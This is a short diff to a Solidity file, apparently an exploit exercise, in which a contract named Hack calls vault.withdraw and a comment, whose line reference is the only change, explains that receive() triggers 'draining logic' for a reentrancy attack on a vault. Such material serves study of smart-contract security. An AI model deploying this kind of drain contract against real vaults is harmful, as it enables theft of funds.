@@ -46,7 +46,7 @@ contract Hack {
     }
     
     function attack() external {
-        // @notice .call interaction with empty data will invoke the receice() function @45 => trigger the draning logic
+        // @notice .call interaction with empty data will invoke the receice() function @54 => trigger the draning logic
         uint amount = vault.balances(address(this));
         vault.withdraw(amount);
     }
